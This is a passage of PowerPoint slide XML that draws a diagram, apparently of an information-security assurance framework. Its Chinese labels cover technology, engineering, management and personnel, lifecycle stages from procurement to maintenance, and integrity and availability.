              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="998"/>
                <a:ext cx="3614" cy="635"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1128 w 3614"/>
                  <a:gd name="T1" fmla="*/ 0 h 635"/>
                  <a:gd name="T2" fmla="*/ 0 w 3614"/>
                  <a:gd name="T3" fmla="*/ 635 h 635"/>
                  <a:gd name="T4" fmla="*/ 2486 w 3614"/>
                  <a:gd name="T5" fmla="*/ 635 h 635"/>
                  <a:gd name="T6" fmla="*/ 3614 w 3614"/>
                  <a:gd name="T7" fmla="*/ 0 h 635"/>
                  <a:gd name="T8" fmla="*/ 1128 w 3614"/>
                  <a:gd name="T9" fmla="*/ 0 h 635"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="3614" h="635">
                    <a:moveTo>
                      <a:pt x="1128" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="635"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2486" y="635"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3614" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="11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15"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="998"/>
                <a:ext cx="3614" cy="635"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 1128 w 3614"/>
                  <a:gd name="T1" fmla="*/ 0 h 635"/>
                  <a:gd name="T2" fmla="*/ 0 w 3614"/>
                  <a:gd name="T3" fmla="*/ 635 h 635"/>
                  <a:gd name="T4" fmla="*/ 2486 w 3614"/>
                  <a:gd name="T5" fmla="*/ 635 h 635"/>
                  <a:gd name="T6" fmla="*/ 3614 w 3614"/>
                  <a:gd name="T7" fmla="*/ 0 h 635"/>
                  <a:gd name="T8" fmla="*/ 1128 w 3614"/>
                  <a:gd name="T9" fmla="*/ 0 h 635"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="3614" h="635">
                    <a:moveTo>
                      <a:pt x="1128" y="0"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="0" y="635"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2486" y="635"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="3614" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1128"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2" name="Group 19"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1545" y="1633"/>
              <a:ext cx="2132" cy="476"/>
              <a:chOff x="1545" y="1633"/>
              <a:chExt cx="2132" cy="476"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="89" name="Rectangle 17"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="1633"/>
                <a:ext cx="2132" cy="4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Rectangle 18"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="1633"/>
                <a:ext cx="2132" cy="476"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="952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3" name="Rectangle 20"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2495" y="1824"/>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技术</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14" name="Group 23"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1545" y="2109"/>
              <a:ext cx="2132" cy="423"/>
              <a:chOff x="1545" y="2109"/>
              <a:chExt cx="2132" cy="423"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="87" name="Rectangle 21"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="2109"/>
                <a:ext cx="2132" cy="4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Rectangle 22"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="2109"/>
                <a:ext cx="2132" cy="423"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="952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5" name="Rectangle 24"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2495" y="2274"/>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工程</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16" name="Group 27"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1545" y="2532"/>
              <a:ext cx="2132" cy="476"/>
              <a:chOff x="1545" y="2532"/>
              <a:chExt cx="2132" cy="476"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="85" name="Rectangle 25"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="2532"/>
                <a:ext cx="2132" cy="4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Rectangle 26"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="2532"/>
                <a:ext cx="2132" cy="476"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="952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7" name="Rectangle 28"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2495" y="2724"/>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管理</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18" name="Group 31"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1545" y="3002"/>
              <a:ext cx="2132" cy="430"/>
              <a:chOff x="1545" y="3002"/>
              <a:chExt cx="2132" cy="430"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="83" name="Rectangle 29"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="3002"/>
                <a:ext cx="2132" cy="4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Rectangle 30"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1545" y="3002"/>
                <a:ext cx="2132" cy="430"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="952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9" name="Rectangle 32"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2495" y="3171"/>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人员</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20" name="Group 35"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="1160" y="1633"/>
              <a:ext cx="385" cy="1799"/>
              <a:chOff x="1160" y="1633"/>
              <a:chExt cx="385" cy="1799"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="81" name="Rectangle 33"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="1633"/>
                <a:ext cx="385" cy="17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Rectangle 34"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="1160" y="1633"/>
                <a:ext cx="385" cy="1799"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:noFill/>
              <a:ln w="952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Rectangle 36"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1278" y="2224"/>
              <a:ext cx="234"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700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                  <a:ln>
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>保</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2" name="Rectangle 37"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1278" y="2390"/>
              <a:ext cx="157"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700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                  <a:ln>
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>障</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3" name="Rectangle 38"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1278" y="2556"/>
              <a:ext cx="157"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700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                  <a:ln>
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>要</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4" name="Rectangle 39"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1278" y="2721"/>
              <a:ext cx="157"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700" b="1" i="0" u="none" strike="noStrike" cap="none" normalizeH="0" baseline="0">
                  <a:ln>
                    <a:noFill/>
                  </a:ln>
                  <a:solidFill>
                    <a:srgbClr val="000000"/>
                  </a:solidFill>
                  <a:effectLst/>
                  <a:latin typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                  <a:ea typeface="宋体" panose="02010600030101010101" pitchFamily="2" charset="-122"/>
                </a:rPr>
                <a:t>素</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5" name="Freeform 40"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2316" y="997"/>
              <a:ext cx="649" cy="479"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 528 w 649"/>
                <a:gd name="T1" fmla="*/ 0 h 479"/>
                <a:gd name="T2" fmla="*/ 0 w 649"/>
                <a:gd name="T3" fmla="*/ 292 h 479"/>
                <a:gd name="T4" fmla="*/ 121 w 649"/>
                <a:gd name="T5" fmla="*/ 479 h 479"/>
                <a:gd name="T6" fmla="*/ 649 w 649"/>
                <a:gd name="T7" fmla="*/ 188 h 479"/>
                <a:gd name="T8" fmla="*/ 528 w 649"/>
                <a:gd name="T9" fmla="*/ 0 h 479"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="0" t="0" r="r" b="b"/>
              <a:pathLst>
                <a:path w="649" h="479">
                  <a:moveTo>
                    <a:pt x="528" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="121" y="479"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="649" y="188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5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Rectangle 41"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="2743" y="1087"/>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开</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7" name="Rectangle 42"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="2609" y="1180"/>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发</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8" name="Rectangle 43"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="2505" y="1219"/>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采</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9" name="Rectangle 44"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3540000">
              <a:off x="2386" y="1284"/>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购</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0" name="Freeform 45"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="2744" y="985"/>
              <a:ext cx="639" cy="505"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 504 w 639"/>
                <a:gd name="T1" fmla="*/ 0 h 505"/>
                <a:gd name="T2" fmla="*/ 0 w 639"/>
                <a:gd name="T3" fmla="*/ 325 h 505"/>
                <a:gd name="T4" fmla="*/ 135 w 639"/>
                <a:gd name="T5" fmla="*/ 505 h 505"/>
                <a:gd name="T6" fmla="*/ 639 w 639"/>
                <a:gd name="T7" fmla="*/ 180 h 505"/>
                <a:gd name="T8" fmla="*/ 504 w 639"/>
                <a:gd name="T9" fmla="*/ 0 h 505"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="0" t="0" r="r" b="b"/>
              <a:pathLst>
                <a:path w="639" h="505">
                  <a:moveTo>
                    <a:pt x="504" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="325"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="135" y="505"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="639" y="180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="50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Rectangle 46"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3300000">
              <a:off x="3158" y="1079"/>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实</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2" name="Rectangle 47"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3300000">
              <a:off x="3044" y="1152"/>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施</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3" name="Rectangle 48"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3300000">
              <a:off x="2930" y="1225"/>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交</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4" name="Rectangle 49"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3300000">
              <a:off x="2816" y="1299"/>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付</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5" name="Freeform 50"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="3211" y="987"/>
              <a:ext cx="642" cy="499"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 510 w 642"/>
                <a:gd name="T1" fmla="*/ 0 h 499"/>
                <a:gd name="T2" fmla="*/ 0 w 642"/>
                <a:gd name="T3" fmla="*/ 318 h 499"/>
                <a:gd name="T4" fmla="*/ 132 w 642"/>
                <a:gd name="T5" fmla="*/ 499 h 499"/>
                <a:gd name="T6" fmla="*/ 642 w 642"/>
                <a:gd name="T7" fmla="*/ 181 h 499"/>
                <a:gd name="T8" fmla="*/ 510 w 642"/>
                <a:gd name="T9" fmla="*/ 0 h 499"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="0">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
                <a:cxn ang="0">
                  <a:pos x="T8" y="T9"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="0" t="0" r="r" b="b"/>
              <a:pathLst>
                <a:path w="642" h="499">
                  <a:moveTo>
                    <a:pt x="510" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="318"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="132" y="499"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="642" y="181"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="51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Rectangle 51"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3360000">
              <a:off x="3628" y="1080"/>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7" name="Rectangle 52"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3360000">
              <a:off x="3514" y="1152"/>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行</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8" name="Rectangle 53"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3360000">
              <a:off x="3398" y="1223"/>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维</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9" name="Rectangle 54"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="3360000">
              <a:off x="3284" y="1295"/>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护</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0" name="Line 55"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="1935" y="998"/>
              <a:ext cx="838" cy="476"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525"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Line 56"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="2450" y="998"/>
              <a:ext cx="838" cy="476"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525"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Line 57"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="2901" y="998"/>
              <a:ext cx="838" cy="476"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525"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Line 58"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="3420" y="998"/>
              <a:ext cx="838" cy="477"/>
            </a:xfrm>
            <a:prstGeom prst="line">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="9525"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Line 59"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipV="1">
              <a:off x="1160" y="1633"/>
              <a:ext cx="0" cy="1799"/>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Line 60"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="1160" y="1633"/>
              <a:ext cx="2498" cy="0"/>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Line 61"/>
            <p:cNvSpPr>
              <a:spLocks noChangeShapeType="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm flipH="1">
              <a:off x="1160" y="3432"/>
              <a:ext cx="2498" cy="0"/>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Rectangle 62"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4168" y="2217"/>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完</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8" name="Rectangle 63"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4168" y="2346"/>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整</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9" name="Rectangle 64"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4168" y="2474"/>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性</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0" name="Rectangle 65"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4552" y="2001"/>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可</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1" name="Rectangle 66"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4552" y="2129"/>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用</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2" name="Rectangle 67"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="4552" y="2257"/>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性</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53" name="Group 70"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="3647" y="1867"/>
              <a:ext cx="389" cy="1566"/>
              <a:chOff x="3647" y="1867"/>
              <a:chExt cx="389" cy="1566"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="79" name="Freeform 68"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3647" y="1867"/>
                <a:ext cx="389" cy="1566"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 389"/>
                  <a:gd name="T1" fmla="*/ 234 h 1566"/>
                  <a:gd name="T2" fmla="*/ 389 w 389"/>
                  <a:gd name="T3" fmla="*/ 0 h 1566"/>
                  <a:gd name="T4" fmla="*/ 389 w 389"/>
                  <a:gd name="T5" fmla="*/ 1332 h 1566"/>
                  <a:gd name="T6" fmla="*/ 0 w 389"/>
                  <a:gd name="T7" fmla="*/ 1566 h 1566"/>
                  <a:gd name="T8" fmla="*/ 0 w 389"/>
                  <a:gd name="T9" fmla="*/ 234 h 1566"/>
                </a:gdLst>
                <a:ahLst/>
                <a:cxnLst>
                  <a:cxn ang="0">
                    <a:pos x="T0" y="T1"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T2" y="T3"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T4" y="T5"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T6" y="T7"/>
                  </a:cxn>
                  <a:cxn ang="0">
                    <a:pos x="T8" y="T9"/>
                  </a:cxn>
                </a:cxnLst>
                <a:rect l="0" t="0" r="r" b="b"/>
                <a:pathLst>
                  <a:path w="389" h="1566">
                    <a:moveTo>
                      <a:pt x="0" y="234"/>
                    </a:moveTo>
                    <a:lnTo>
                      <a:pt x="389" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="389" y="1332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="1566"/>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69"/>
              <p:cNvSpPr>
                <a:spLocks/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3647" y="1867"/>
                <a:ext cx="389" cy="1566"/>
              </a:xfrm>
              <a:custGeom>
                <a:avLst/>
                <a:gdLst>
                  <a:gd name="T0" fmla="*/ 0 w 389"/>
                  <a:gd name="T1" fmla="*/ 234 h 1566"/>
                  <a:gd name="T2" fmla="*/ 389 w 389"/>
